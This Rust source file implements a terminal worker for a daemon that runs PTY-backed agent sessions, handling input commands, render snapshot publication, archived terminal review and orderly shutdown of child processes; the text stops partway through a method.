mod archive;
mod carry;
mod close_processes;
#[cfg(test)]
mod close_tests;
pub(crate) mod holder;
mod joins;

use close_processes::{AdmittedDirectory, FrozenFamily, RootIdentity};

use std::{
    cell::{Cell, RefCell},
    collections::{HashMap, VecDeque},
    fs::File,
    io::{BufWriter, Read, Write},
    os::fd::{AsRawFd, FromRawFd, OwnedFd},
    path::PathBuf,
    rc::Rc,
    sync::{
        Arc, Condvar, Mutex, OnceLock, Weak,
        atomic::{AtomicBool, AtomicU8, AtomicU64, Ordering},
    },
    thread::{self, JoinHandle},
    time::{Duration, SystemTime, UNIX_EPOCH},
};

use arc_swap::ArcSwap;
use crossbeam_channel::{Receiver, RecvTimeoutError, Sender, TryRecvError, TrySendError};
use libghostty_vt::{
    Terminal, TerminalOptions, focus,
    key::{self, Encoder as KeyEncoder},
    mouse::{self, Encoder as MouseEncoder},
    style::{PaletteIndex, RgbColor},
    terminal::{ColorScheme, CompressionMode, CompressionResult, Mode, ScrollViewport},
};
use portable_pty::{CommandBuilder, ExitStatus, PtySize};

use crate::{
    model::{
        LaunchRecipe, TerminalId, TerminalOutputActivity, TerminalSession,
        agent_recovery::AgentProcess,
    },
    secure_file::open_private_append_file,
};

use super::{
    TerminalTheme,
    snapshot::{RenderSnapshot, VisualResources},
    types::{
        KeyAction, KeyInput, KeyModifiers, MouseAction, MouseButton, MouseInput, PasteOrigin,
        TerminalConfig, TerminalEvent, TerminalKey, TerminalSendError, TerminalSize,
        TerminalStartError, TerminalWake,
    },
};

const PTY_READ_SIZE: usize = 16 * 1024;
const PTY_BATCH_LIMIT: usize = 256 * 1024;
/// At most two maximum pastes can await a child that stopped reading.
const PTY_WRITE_CAPACITY: usize = 2 * 1024 * 1024 + 32;
const PTY_WRITE_RETRY: Duration = Duration::from_millis(10);
/// Includes graceful child escalation and reader cleanup, with scheduling slack.
const WORKER_JOIN_TIMEOUT: Duration = Duration::from_secs(5);
/// Marker appended once when a transcript hits its size cap.
const TRANSCRIPT_TRUNCATED_MARKER: &[u8] = b"\n[cagents transcript truncated: size cap reached]\n";
/// Foreground observation cadence. Every tick descends `/proc` over the PTY
/// foreground subtree, so it is only worth paying while that group is moving:
/// an unchanged group backs the interval off, any change resets it, and a
/// terminal nobody is watching is never observed on the timer at all.
const FOREGROUND_POLL_MIN: Duration = Duration::from_secs(2);
const FOREGROUND_POLL_MAX: Duration = Duration::from_secs(30);
/// Allow a root's HUP handler to finish before forcing its pinned family.
const CHILD_HANGUP_GRACE: Duration = Duration::from_millis(500);
/// Total budget for hangup, escalation and an authoritative holder exit report.
const CHILD_SHUTDOWN_DEADLINE: Duration = Duration::from_secs(3);
/// How long shutdown waits for the PTY reader to leave its blocking read
/// before abandoning the thread. Closing its wake pipe releases the read
/// immediately in every case we can construct; this only bounds the ones we
/// cannot, because a hung join here wedges the daemon's dispatch thread.
const READER_SHUTDOWN_GRACE: Duration = Duration::from_millis(500);
/// How long a synchronized update (DEC mode 2026) may withhold output from the
/// published grid. A program brackets a frame it has to emit in several writes
/// - clearing the screen, then repainting it - so that no half-drawn frame is
/// shown; reads split that frame arbitrarily, and publishing between them
/// flashes an empty screen. Ghostty bounds the hold the same way, so a program
/// that dies or never ends the update cannot freeze its card.
const SYNCHRONIZED_OUTPUT_TIMEOUT: Duration = Duration::from_secs(1);
/// Bells signal attention, not a count of bytes. Publish the first promptly,
/// then at most one pending reminder per interval, independently of PTY rate.
const BELL_INTERVAL: Duration = Duration::from_millis(100);

#[derive(Debug)]
enum Command {
    Interrupt(Option<KeyInput>),
    OrderedInput {
        generation: u64,
        input: Box<Command>,
    },
    Input(Vec<u8>),
    Paste(String, PasteOrigin),
    Key(KeyInput),
    Mouse(MouseInput),
    ReadViewport {
        offset: Option<u64>,
        rows: u16,
        reply: Sender<Result<Arc<RenderSnapshot>, String>>,
    },
    Focus(bool),
    Resize(TerminalSize),
    Scroll(ScrollCommand),
    SetTheme(TerminalTheme),
    ClearScrollback,
    CopySelection {
        request: uuid::Uuid,
        selection: super::SearchMatch,
    },
    Search {
        owner: Option<u64>,
        request: u64,
        query: String,
        case_sensitive: bool,
        latest: Arc<AtomicU64>,
    },
    HostVisibility(Visibility),
    Hide,
    Reveal,
    Hibernate,
    Restore {
        visible: bool,
    },
    ObserveAgent(Sender<Option<String>>),
    CheckInputDrained(Sender<Result<(), String>>),
    PrepareUpgrade(Sender<Result<UpgradeSnapshot, String>>),
    Carry {
        socket: PathBuf,
        reply: Sender<Result<Carried, String>>,
    },
    PreserveForRestart(Sender<Result<(), String>>),
    ObserveAgentProcess(Sender<Option<AgentProcess>>),
    ApplyAgentActivity {
        process: AgentProcess,
        activity: Option<crate::agent::Activity>,
        title: Option<String>,
        reply: Sender<Option<crate::agent::Activity>>,
        deadline: std::time::Instant,
    },
    CloseIfRevision {
        revision: u64,
        reply: Sender<Result<(), String>>,
    },
    StopSession {
        instance: uuid::Uuid,
        deadline: std::time::Instant,
        reply: Sender<super::ipc::TerminalCloseResult>,
    },
    CloseChecked {
        allow_active: bool,
        deadline: std::time::Instant,
        reply: Sender<super::ipc::TerminalCloseResult>,
    },
    Shutdown,
}

/// Reversible process freeze. Dropping an uncommitted snapshot resumes its
/// exact pidfd-bound family; only committed handoff is allowed to kill it.
pub(crate) struct UpgradeSnapshot {
    pub(crate) hint: Option<String>,
    pub(crate) active: bool,
    pub(crate) size: TerminalSize,
    pub(crate) theme: TerminalTheme,
    family: FrozenFamily,
}

impl UpgradeSnapshot {
    pub(crate) fn only_agent_tree(&self, pid: i32) -> bool {
        self.family.only_agent_tree(pid)
    }

    pub(crate) fn stop(&mut self) -> Result<(), String> {
        self.family
            .kill(std::time::Instant::now() + std::time::Duration::from_secs(10))
    }
}

/// What a successor needs to show a carried terminal as it was.
#[derive(Clone, Debug)]
pub(crate) struct Carried {
    pub(crate) size: TerminalSize,
    pub(crate) theme: TerminalTheme,
    /// The conversation its agent was last seen in, as of the carry.
    pub(crate) hint: Option<String>,
}

#[derive(Clone, Copy, Debug)]
enum ScrollCommand {
    Top,
    Bottom,
    Delta(isize),
    Row(usize),
}

#[derive(Debug)]
enum PtyMessage {
    Bytes(Vec<u8>),
    Eof,
    Error(String),
}

type ChildExit = Result<ExitStatus, String>;

#[derive(Debug)]
enum WorkerEvent {
    Command(Option<Command>),
    Pty(Option<PtyMessage>),
    ChildExit(Option<ChildExit>),
    Capture,
    /// Foreground observation or a synchronized update's hold came due.
    Timer,
}

#[derive(Debug)]
enum TranscriptMessage {
    Bytes(Vec<u8>),
    Shutdown,
}

#[derive(Debug)]
enum Effect {
    PtyWrite(Vec<u8>),
    Bell,
    Title(String),
    WorkingDirectoryChanged,
}

/// Collapse parser metadata before it can allocate one effect per escape or
/// bell byte. PTY replies remain ordered and lossless; titles and cwd describe
/// the final parser state of this batch.
#[derive(Default)]
struct Effects {
    ordered: Vec<Effect>,
    bell: bool,
    title: Option<usize>,
    cwd: bool,
}

impl Effects {
    fn push(&mut self, effect: Effect) {
        match effect {
            Effect::Bell => {
                if !std::mem::replace(&mut self.bell, true) {
                    self.ordered.push(Effect::Bell);
                }
            }
            Effect::WorkingDirectoryChanged => {
                if !std::mem::replace(&mut self.cwd, true) {
                    self.ordered.push(Effect::WorkingDirectoryChanged);
                }
            }
            Effect::Title(title) => {
                if let Some(index) = self.title {
                    self.ordered[index] = Effect::Title(title);
                } else {
                    self.title = Some(self.ordered.len());
                    self.ordered.push(Effect::Title(title));
                }
            }
            effect => self.ordered.push(effect),
        }
    }

    fn retain_title(&mut self) {
        let old = std::mem::take(self);
        for effect in old.ordered {
            if matches!(effect, Effect::Title(_)) {
                self.push(effect);
            }
        }
    }
}

#[derive(Default)]
struct Bell {
    pending: bool,
    next: Option<std::time::Instant>,
}

impl Bell {
    fn take_ready(&mut self, now: std::time::Instant) -> bool {
        if self.pending && self.next.is_none_or(|next| now >= next) {
            self.pending = false;
            self.next = Some(now + BELL_INTERVAL);
            true
        } else {
            false
        }
    }

    fn release_after(&self) -> Option<Duration> {
        self.pending.then(|| {
            self.next.map_or(Duration::ZERO, |next| {
                next.saturating_duration_since(std::time::Instant::now())
            })
        })
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Visibility {
    Visible,
    Hidden,
    Hibernated,
}

type WakeCallback = dyn Fn(TerminalWake) + Send + Sync + 'static;

/// Admitted stop of an exact worker. Waiting and joining happen after global
/// admission is released. Dropping this receipt never reopens worker input.
pub(crate) struct TerminalSessionStop {
    handle: TerminalHandle,
    result: Receiver<super::ipc::TerminalCloseResult>,
}
impl TerminalSessionStop {
    pub(crate) fn finish(self, deadline: std::time::Instant) -> Result<(), String> {
        match self.result.recv_timeout(deadline.saturating_duration_since(std::time::Instant::now())) {
            Ok(super::ipc::TerminalCloseResult::Closed) => {},
            Ok(other) => return Err(format!("Session stop cleanup is unconfirmed: {other:?}")),
            Err(error) => return Err(format!("Session stop cleanup is unconfirmed; its owner remains retained: {error}")),
        }
        if let Some(worker) = self.handle.take_worker_until(deadline).map_err(|error|error.to_string())? {
            if !join_worker_until(worker, &self.handle.inner.published, deadline, true) {
                return Err("Terminal stop cleanup exceeded its deadline; its exact owner remains retained".into());
            }
        }
        if !self.handle.is_completed() {
            return Err("Terminal stop cleanup has not been confirmed".into());
        }
        self.handle.release_completed_holder();
        Ok(())
    }
}

enum ArchivePhase {
    Live,
    Preparing,
    Frozen {
        history: Result<archive::History, String>,
        events: Arc<Sender<TerminalEvent>>,
    },
    Released,
}

type ArchiveObserver = dyn Fn(TerminalEvent) + Send + Sync;

/// Runs a completed terminal's subscriber callback on a thread of its own.
///
/// A completed terminal has no worker, so its commands execute on whichever
/// thread sends them, and the daemon sends them while holding the host mutex
/// its wake and event callbacks lock. Calling either inline deadlocks that
/// thread against itself and, behind it, every other user of the host. One
/// shared thread keeps the notifications of all completed terminals ordered.
fn notify_archived(notice: impl FnOnce() + Send + 'static) {
    type Notice = Box<dyn FnOnce() + Send>;
    static NOTIFIER: OnceLock<Sender<Notice>> = OnceLock::new();
    let notifier = NOTIFIER.get_or_init(|| {
        let (notices, pending) = crossbeam_channel::unbounded::<Notice>();
        if let Err(error) = thread::Builder::new()
            .name("terminal-archive-notify".into())
            .spawn(move || {
                for notice in pending {
                    // This thread serves every completed terminal for the life
                    // of the process. A subscriber that panics has already
                    // been reported by the panic hook; it must not take the
                    // redraws and search results of all the others with it.
                    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(notice));
                }
            })
        {
            tracing::error!(%error, "completed terminals cannot notify their subscribers");
        }
        notices
    });
    // Sending fails only when that thread never started, which is reported
    // above.
    let _ = notifier.send(Box::new(notice));
}

/// Returns once every notice queued before this call has run.
#[cfg(test)]
pub(crate) fn flush_archived_notices() {
    let (done, flushed) = crossbeam_channel::bounded(1);
    notify_archived(move || {
        let _ = done.send(());
    });
    flushed
        .recv_timeout(Duration::from_secs(5))
        .expect("the archive notifier stalled");
}

#[derive(Default)]
struct InputOrder {
    /// Successfully admitted input, independent of the cancellation epoch.
    close_revision: u64,
    closing: bool,
    /// A carry has fenced further admission until its outcome is known.
    handoff: bool,
    generation: u64,
    interrupt_key: Option<KeyInput>,
}

struct PublishedState {
    execution_instance: uuid::Uuid,
    admitted_directory: OnceLock<AdmittedDirectory>,
    snapshot: ArcSwap<RenderSnapshot>,
    published_generation: AtomicU64,
    acknowledged_generation: AtomicU64,
    capture_tx: Sender<()>,
    capture_rx: Receiver<()>,
    activity: Mutex<Option<TerminalOutputActivity>>,
    agent_activity: Mutex<Option<crate::agent::Activity>>,
    agent_process: Mutex<Option<AgentProcess>>,
    agent_observer: OnceLock<Arc<dyn Fn() + Send + Sync>>,
    semantic_events: OnceLock<Weak<Sender<TerminalEvent>>>,
    conversation_title: Mutex<Option<String>>,
    searches: Mutex<HashMap<Option<u64>, Weak<AtomicU64>>>,
    archive: Mutex<ArchivePhase>,
    archive_ready: Condvar,
    archive_observer: OnceLock<Arc<ArchiveObserver>>,
    completed: AtomicBool,
    /// 0 unadmitted, 1 retained by the join service, 2 joined, 3 panicked.
    worker_join: AtomicU8,
    join_reservation: OnceLock<joins::Reservation>,
    shutdown_requested: AtomicBool,
    interrupt_requested: AtomicBool,
    input_order: Mutex<InputOrder>,
    priority_close: Mutex<Option<Command>>,
    shutdown_pidfd: OnceLock<File>,
    /// Final result ownership survives emulator teardown and daemon crashes.
    retained_holder: Mutex<Option<holder::Holder>>,
    holder_identity: OnceLock<super::holder::Record>,
    // The source descriptors pin both identities through terminal retirement;
    // numeric inode receipts alone cannot distinguish later inode reuse.
    transcript_location: OnceLock<crate::transcript_location::ValidatedTranscript>,
    /// The newest generation a wake has already announced to the subscriber
    /// side of this protocol.
    ///
    /// Announcing each published generation exactly once is still one wake per
    /// drawn frame, because `capture_if_ready` withholds the next capture until
    /// that generation is acknowledged. A "a wake is pending" flag measured the
    /// same thing but could only be cleared by an acknowledgement, so an edge
    /// its callback dropped - a repaint broadcast while no subscriber was
    /// visible - suppressed every later generation, including the capture a
    /// reveal forces.
    announced_generation: AtomicU64,
    visible: AtomicBool,
    wake: Arc<WakeCallback>,
    output_observer: OnceLock<Arc<dyn Fn(u64) + Send + Sync>>,
    output_armed: AtomicBool,
}

impl PublishedState {
    fn close_observation(&self) -> Result<(u64, bool), String> {
        let order=self.input_order.lock().unwrap_or_else(|p|p.into_inner());
        let revision=order.close_revision;
        if self.completed.load(Ordering::Acquire) { return Ok((revision,false)); }
        if order.closing || order.handoff { return Err("Terminal ownership is changing; refresh its census after it settles".into()); }
        drop(order);
        // Unknown activity needs explicit attention, including a shell builtin
        // with no child process. This advisory sample is never an idle proof:
        // conditional close independently refuses every unproved live owner.
        let busy=self.agent_activity.lock().unwrap_or_else(|p|p.into_inner())
            .is_none_or(|activity|activity.state!=crate::agent::ActivityState::Idle);
        Ok((revision,busy))
    }
    fn new(visible: bool, wake: Arc<WakeCallback>) -> Self {
        let (capture_tx, capture_rx) = crossbeam_channel::bounded(1);
        Self {
            execution_instance: uuid::Uuid::new_v4(),
            admitted_directory: OnceLock::new(),
            snapshot: ArcSwap::from_pointee(RenderSnapshot::empty()),
            published_generation: AtomicU64::new(0),
            acknowledged_generation: AtomicU64::new(0),
            capture_tx,
            capture_rx,
            activity: Mutex::new(None),
            agent_activity: Mutex::new(None),
            agent_process: Mutex::new(None),
            agent_observer: OnceLock::new(),
            semantic_events: OnceLock::new(),
            conversation_title: Mutex::new(None),
            searches: Mutex::new(HashMap::new()),
            archive: Mutex::new(ArchivePhase::Live),
            archive_ready: Condvar::new(),
            archive_observer: OnceLock::new(),
            completed: AtomicBool::new(false),
            worker_join: AtomicU8::new(0),
            join_reservation: OnceLock::new(),
            shutdown_requested: AtomicBool::new(false),
            interrupt_requested: AtomicBool::new(false),
            input_order: Mutex::new(InputOrder::default()),
            priority_close: Mutex::new(None),
            shutdown_pidfd: OnceLock::new(),
            retained_holder: Mutex::new(None),
            holder_identity: OnceLock::new(),
            transcript_location: OnceLock::new(),
            announced_generation: AtomicU64::new(0),
            visible: AtomicBool::new(visible),
            wake,
            output_observer: OnceLock::new(),
            output_armed: AtomicBool::new(false),
        }
    }

    fn request_interrupt(&self, key: Option<KeyInput>) -> bool {
        let mut order = self.input_order.lock().unwrap_or_else(|p| p.into_inner());
        if order.closing || order.handoff { return false; }
        order.generation = order
            .generation
            .checked_add(1)
            .expect("terminal input generation exhausted");
        order.close_revision = order.close_revision.checked_add(1).expect("terminal close revision exhausted");
        order.interrupt_key = key;
        self.interrupt_requested.store(true, Ordering::Release);
        let _ = self.capture_tx.try_send(());
        true
    }

    fn request_shutdown(&self) {
        self.shutdown_requested.store(true, Ordering::Release);
        // Wake the same select loop as capture credit. A full wake channel
        // already guarantees a pending event; shutdown cannot wait on input.
        let _ = self.capture_tx.try_send(());
    }

    fn prepare_search(&self, owner: Option<u64>, request: u64) -> Arc<AtomicU64> {
        let mut searches = self.searches.lock().unwrap_or_else(|p| p.into_inner());
        // Only queued or active searches retain their cancellation token.
        searches.retain(|_, token| token.strong_count() > 0);
        let latest = searches
            .get(&owner)
            .and_then(Weak::upgrade)
            .unwrap_or_else(|| {
                let latest = Arc::new(AtomicU64::new(request));
                searches.insert(owner, Arc::downgrade(&latest));
                latest
            });
        latest.store(request, Ordering::Release);
        latest
    }

    fn archived_command(self: &Arc<Self>, command: Command) -> Result<(), TerminalSendError> {
        if let Command::HostVisibility(visibility) = &command {
            // HostState already offers this retained generation when a view
            // becomes visible. Calling its wake callback here would reenter
            // the host mutex held by visibility/attach/detach operations.
            self.visible
                .store(*visibility == Visibility::Visible, Ordering::Release);
            return Ok(());
        }
        if !matches!(
            &command,
            Command::ReadViewport { .. }
                | Command::Search { .. }
                | Command::CopySelection { .. }
                | Command::Scroll(_)
                | Command::Resize(_)
                | Command::SetTheme(_)
                | Command::ClearScrollback
                | Command::Hide
                | Command::Hibernate
                | Command::Reveal
                | Command::Restore { .. }
                | Command::Focus(_)
        ) {
            return Err(TerminalSendError::Closed);
        }
        let mut phase = self.archive.lock().unwrap_or_else(|p| p.into_inner());
        let ArchivePhase::Frozen { history, events } = &mut *phase else {
            return Err(TerminalSendError::Closed);
        };
        let events = events.clone();
        let result = match history {
            Err(message) => Some(TerminalEvent::Error {
                operation: "review completed terminal",
                message: message.clone(),
            }),
            Ok(history) => {
                match command {
                    Command::Search {
                        owner,
                        request,
                        query,
                        case_sensitive,
                        latest,
                    } => {
                        let source = history.source();
                        drop(phase);
                        let result = source
                            .search(&query, case_sensitive, || {
                                latest.load(Ordering::Acquire) != request
                            })
                            .map(|(matches, truncated)| TerminalEvent::SearchResults {
                                owner,
                                request,
                                query,
                                matches,
                                truncated,
                            });
                        if let Some(event) = result {
                            self.emit_archived(&events, event);
                        }
                        return Ok(());
                    }
                    Command::CopySelection { request, selection } => {
                        let source = history.source();
                        drop(phase);
                        let event = match source.copy(selection) {
                            Ok(text) => TerminalEvent::ClipboardText { request, text },
                            Err(message) => TerminalEvent::Error {
                                operation: "copy completed terminal selection",
                                message,
                            },
                        };
                        self.emit_archived(&events, event);
                        return Ok(());
                    }
                    Command::ReadViewport {
                        offset,
                        rows,
                        reply,
                    } => {
                        let _ = reply.send(Ok(history.snapshot_at(
                            offset,
                            rows,
                            self.published_generation.load(Ordering::Acquire),
                        )));
                        return Ok(());
                    }
                    Command::Scroll(scroll) => history.scroll(&scroll),
                    Command::Resize(size) => history.resize(size),
                    Command::SetTheme(theme) => history.set_theme(theme),
                    Command::ClearScrollback => history.clear(),
                    Command::Hide | Command::Hibernate => {
                        self.visible.store(false, Ordering::Release)
                    }
                    Command::Reveal => self.visible.store(true, Ordering::Release),
                    Command::Restore { visible } => self.visible.store(visible, Ordering::Release),
                    Command::Focus(_) => return Ok(()),
                    _ => return Err(TerminalSendError::Closed),
                }
                let snapshot = history.snapshot(
                    self.published_generation
                        .load(Ordering::Acquire)
                        .saturating_add(1),
                );
                // Serialize mutations and publication; wake outside the lock
                // so subscriber callbacks can inspect the retained surface,
                // and off this thread because the sender may hold the host.
                let generation = snapshot.generation;
                self.snapshot.store(snapshot);
                self.published_generation
                    .store(generation, Ordering::Release);
                drop(phase);
                let published = Arc::downgrade(self);
                notify_archived(move || {
                    // Announce whatever is newest by now, so a burst of
                    // commands queued behind the host costs one redraw.
                    if let Some(published) = published.upgrade() {
                        published
                            .request_wake(published.published_generation.load(Ordering::Acquire));
                    }
                });
                return Ok(());
            }
        };
        drop(phase);
        if let Some(event) = result {
            self.emit_archived(&events, event);
        }
        Ok(())
    }

    fn emit_archived(&self, events: &Sender<TerminalEvent>, event: TerminalEvent) {
        if let Some(observer) = self.archive_observer.get().cloned() {
            notify_archived(move || observer(event));
        } else {
            let _ = events.send(event);
        }
    }

    fn set_agent_activity(&self, activity: Option<crate::agent::Activity>) {
        let mut current = self
            .agent_activity
            .lock()
            .unwrap_or_else(|p| p.into_inner());
        if *current != activity {
            *current = activity;
            // Serialize metadata and its edge, including timeout invalidation
            // from another thread. The weak sender cannot keep a dead worker's
            // semantic stream open through its host event receiver.
            if let Some(events) = self.semantic_events.get().and_then(Weak::upgrade) {
                let _ = events.send(TerminalEvent::AgentActivityChanged(activity));
            }
        }
    }

    fn publish(&self, snapshot: Arc<RenderSnapshot>) {
        let generation = snapshot.generation;
        // The immutable snapshot must be observable before the edge is emitted.
        self.snapshot.store(snapshot);
        self.published_generation
            .store(generation, Ordering::Release);
        self.request_wake(generation);
    }

    fn detach(&self, generation: u64) {
        self.snapshot
            .store(Arc::new(RenderSnapshot::detached(generation)));
        self.published_generation
            .store(generation, Ordering::Release);
    }

    fn request_wake(&self, generation: u64) {
        if !self.visible.load(Ordering::Acquire) {
            return;
        }
        if self
            .announced_generation
            .fetch_max(generation, Ordering::AcqRel)
            < generation
        {
            (self.wake)(TerminalWake { generation });
        }
    }

    fn suppress_wakes(&self) {
        self.visible.store(false, Ordering::Release);
    }

    /// Records the generation the subscriber drew and releases the capture
    /// credit for the next one.
    ///
    /// It re-arms nothing: a publication announces its own generation, so
    /// there is no edge for an acknowledgement to re-open.
    fn acknowledge(&self, observed_generation: u64) {
        // A subscriber cannot acknowledge a generation this worker never
        // published; that would let the capture loop run ahead of the UI.
        let observed_generation =
            observed_generation.min(self.published_generation.load(Ordering::Acquire));
        let previous = self
            .acknowledged_generation
            .fetch_max(observed_generation, Ordering::AcqRel);
        if observed_generation > previous {
            let _ = self.capture_tx.try_send(());
        }
    }
}

struct HandleInner {
    commands: Sender<Command>,
    events: Receiver<TerminalEvent>,
    published: Arc<PublishedState>,
    worker: Arc<Mutex<Option<JoinHandle<()>>>>,
}

impl Drop for HandleInner {
    fn drop(&mut self) {
        self.published.request_shutdown();
        // Final destruction only admits cleanup; a TLS destructor or callback
        // must never make the dropping thread wait on its own lifetime.
        let _ = joins::join_until(
            &self.worker,
            &self.published,
            std::time::Instant::now() + WORKER_JOIN_TIMEOUT,
            true,
            false,
        );
    }
}

#[derive(Clone)]
pub struct TerminalHandle {
    inner: Arc<HandleInner>,
}

impl std::fmt::Debug for TerminalHandle {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        formatter
            .debug_struct("TerminalHandle")
            .field("generation", &self.generation())
            .finish_non_exhaustive()
    }
}

impl TerminalHandle {
    /// Warm fixed join resources before measuring the host's idle baseline.
    pub(crate) fn initialize_worker_joins() -> Result<(), String> { joins::initialize() }

    /// Captured from the authenticated original holder before worker startup;
    /// never rediscovered by a reusable terminal ID.
    pub(crate) fn holder_identity(&self) -> Option<&super::holder::Record> {
        self.inner.published.holder_identity.get()
    }
    pub(crate) fn transcript_location(&self) -> Option<crate::model::TranscriptLocationReceipt> {
        self.inner
            .published
            .transcript_location
            .get()
            .map(|location| location.receipt())
    }
    pub fn spawn(
        session: TerminalSession,
        config: TerminalConfig,
        wake: impl Fn(TerminalWake) + Send + Sync + 'static,
    ) -> Result<Self, TerminalStartError> {
        let reservation = joins::reserve().map_err(TerminalStartError::Worker)?;
        let (command_tx, command_rx) = command_channel(config.command_capacity);
        // Semantic events are lossless and independent from visual wakes. They
        // are low-volume metadata; an unbounded queue avoids either dropping a
        // terminal exit/error or deadlocking teardown behind the UI receiver.
        let (event_tx, event_rx) = crossbeam_channel::unbounded();
        let published = Arc::new(PublishedState::new(
            config.initially_visible,
            Arc::new(wake),
        ));
        published.join_reservation.set(reservation).expect("a new worker has exactly one cleanup reservation");
        let worker_published = Arc::clone(&published);
        let (startup_tx, startup_rx) = std::sync::mpsc::sync_channel(1);

        let worker = thread::Builder::new()
            .name(format!("terminal-{:?}", session.id))
            .spawn(move || {
                let completion = Arc::clone(&worker_published);
                let result = Worker::start(session, config, command_rx, event_tx, worker_published);
                match result {
                    Ok(worker) => {
                        let _ = startup_tx.send(Ok(()));
                        worker.run();
                    }
                    Err(error) => {
                        let _ = startup_tx.send(Err(error));
                        completion.completed.store(true, Ordering::Release);
                    }
                }
            })
            .map_err(|error| TerminalStartError::Worker(error.to_string()))?;

        match startup_rx.recv() {
            Ok(Ok(())) => Ok(Self {
                inner: Arc::new(HandleInner {
                    commands: command_tx,
                    events: event_rx,
                    published,
                    worker: Arc::new(Mutex::new(Some(worker))),
                }),
            }),
            Ok(Err(error)) => {
                let slot = Arc::new(Mutex::new(Some(worker)));
                let _ = joins::join_until(&slot, &published, std::time::Instant::now() + WORKER_JOIN_TIMEOUT, true, true);
                Err(TerminalStartError::Worker(error))
            }
            Err(_) => {
                let slot = Arc::new(Mutex::new(Some(worker)));
                let _ = joins::join_until(&slot, &published, std::time::Instant::now() + WORKER_JOIN_TIMEOUT, true, true);
                Err(TerminalStartError::WorkerExited)
            }
        }
    }

    pub(crate) fn viewport_snapshot(
        &self,
        offset: Option<u64>,
        rows: u16,
    ) -> Result<Arc<RenderSnapshot>, String> {
        let published = self.snapshot();
        if published.detached || published.rows == 0 {
            return Ok(published);
        }
        if offset.is_none()
            && rows == published.rows
            && published.scroll.offset == published.scroll.max_offset()
        {
            return Ok(published);
        }
        let (reply, receive) = crossbeam_channel::bounded(1);
        self.try_command(Command::ReadViewport {
            offset,
            rows,
            reply,
        })
        .map_err(|error| error.to_string())?;
        receive
            .recv_timeout(Duration::from_secs(3))
            .map_err(|error| error.to_string())?
    }

    pub fn snapshot(&self) -> Arc<RenderSnapshot> {
        self.inner.published.snapshot.load_full()
    }

    pub fn activity(&self) -> Option<TerminalOutputActivity> {
        *self
            .inner
            .published
            .activity
            .lock()
            .unwrap_or_else(|error| error.into_inner())
    }

    pub(crate) fn agent_activity(&self) -> Option<crate::agent::Activity> {
        *self
            .inner
            .published
            .agent_activity
            .lock()
            .unwrap_or_else(|error| error.into_inner())
    }

    pub(crate) fn observe_agent_process(&self) -> Option<AgentProcess> {
        let (reply, result) = crossbeam_channel::bounded(1);
        let process = self
            .try_command(Command::ObserveAgentProcess(reply))
            .ok()
            .and_then(|()| result.recv_timeout(std::time::Duration::from_secs(3)).ok())
            .flatten();
        if process.is_none() {
            self.invalidate_agent_activity();
        }
        process
    }

    /// Process discovery belongs to the PTY owner, independently of GUI clients.
    pub(crate) fn cached_agent_process(&self) -> Option<AgentProcess> {
        self.inner
            .published
            .agent_process
            .lock()
            .unwrap_or_else(|p| p.into_inner())
            .clone()
    }

    pub(crate) fn set_agent_process_observer(&self, observer: impl Fn() + Send + Sync + 'static) {
        let _ = self.inner.published.agent_observer.set(Arc::new(observer));
        if let Some(observer) = self.inner.published.agent_observer.get() {
            observer();
        }
    }

    pub(crate) fn apply_agent_activity(
        &self,
        process: AgentProcess,
        activity: Option<crate::agent::Activity>,
        title: Option<String>,
    ) -> Option<crate::agent::Activity> {
        let (reply, result) = crossbeam_channel::bounded(1);
        let timeout = std::time::Duration::from_secs(3);
        let deadline = std::time::Instant::now() + timeout;
        if self
            .try_command(Command::ApplyAgentActivity {
                process,
                activity,
                title,
                reply,
                deadline,
            })
            .is_ok()
            && let Ok(activity) = result.recv_timeout(timeout)
        {
            return activity;
        }
        self.invalidate_agent_activity();
        None
    }

    fn invalidate_agent_activity(&self) {
        // A failed owner request cannot leave attach descriptors claiming work.
        self.inner.published.set_agent_activity(None);
    }

    #[cfg(test)]
    pub(crate) fn spawn_with_missing_exit_report_for_test(session: TerminalSession) -> Self {
        let (commands, receiver) = command_channel(1);
        let (events, event_receiver) = crossbeam_channel::unbounded();
        let published = Arc::new(PublishedState::new(true, Arc::new(|_| {})));
        let worker_published = Arc::clone(&published);
        let (ready, initialized) = crossbeam_channel::bounded(1);
        let worker = thread::spawn(move || {
            let mut worker = Worker::start(
                session,
                TerminalConfig::default(),
                receiver,
                events,
                worker_published,
            )
            .unwrap();
            assert!(
                !worker.holder.registered(),
                "failure fixture must not write holder recovery into user state"
            );
            worker.disconnected_exit_report();
            // A timed-out caller sets shutdown; still run cleanup if its
            // readiness receiver disappeared instead of panicking first.
            let _ = ready.send(());
            worker.run();
        });
        if let Err(error) = initialized.recv_timeout(Duration::from_secs(5)) {
            published.request_shutdown();
            panic!("test terminal initialization did not finish: {error}");
        }
        Self {
            inner: Arc::new(HandleInner {
                commands,
                events: event_receiver,
                published,
                worker: Arc::new(Mutex::new(Some(worker))),
            }),
        }
    }

    /// True after teardown and either a confirmed root exit or committed carry.
    /// Published before the final `Completed` event when an exit is confirmed.
    /// A stopped parser or foreground-process exit alone releases no ownership.
    pub fn is_completed(&self) -> bool {
        self.inner.published.completed.load(Ordering::Acquire)
    }
    /// Ephemeral identity of this exact resident worker, never a durable
    /// terminal ID or a daemon-wide ownership proof.
    pub(crate) fn execution_instance(&self) -> uuid::Uuid {
        self.inner.published.execution_instance
    }
    /// Physical scope captured from the exact root process when installed.
    pub(crate) fn admitted_directory(&self) -> Option<(Arc<File>, crate::agent_execution::DirectoryIdentity)> {
        self.inner.published.admitted_directory.get().map(|directory| (Arc::clone(&directory.directory), directory.identity))
    }
    pub(crate) fn same_worker(&self, other: &Self) -> bool {
        Arc::ptr_eq(&self.inner, &other.inner)
    }

    pub fn generation(&self) -> u64 {
        self.inner
            .published
            .published_generation
            .load(Ordering::Acquire)
    }

    /// Acknowledges a delivered redraw edge after observing its snapshot.
    /// Call this even if the card became hidden before the edge was handled;
    /// the client calls it after drawing.
    pub fn acknowledge_redraw(&self, observed_generation: u64) {
        self.inner.published.acknowledge(observed_generation);
    }

    /// Install the host's lightweight observer before arming a subscription.
    pub(crate) fn set_output_observer(&self, observer: impl Fn(u64) + Send + Sync + 'static) {
        let _ = self.inner.published.output_observer.set(Arc::new(observer));
    }

    /// Arm one output edge and return its history boundary atomically with PTY
    /// activity publication. Captures and redraw credit are deliberately unrelated.
    pub(crate) fn observe_next_output(&self) -> u64 {
        let published = &self.inner.published;
        let activity = published
            .activity
